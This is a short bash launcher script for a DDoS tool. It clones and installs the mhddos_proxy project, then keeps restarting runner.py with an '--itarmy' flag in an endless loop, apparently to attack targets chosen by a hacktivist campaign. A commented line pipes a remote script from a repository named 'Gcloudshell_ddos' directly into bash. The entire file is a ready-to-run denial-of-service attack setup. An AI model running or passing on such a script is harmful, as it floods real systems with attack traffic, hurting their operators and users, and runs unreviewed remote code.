#!/bin/bash
#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/X/itarmyX.sh | bash
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

while true
do
   pkill -f runner.py
   sleep 7
   python3 runner.py --itarmy --debug
sleep 14m
done
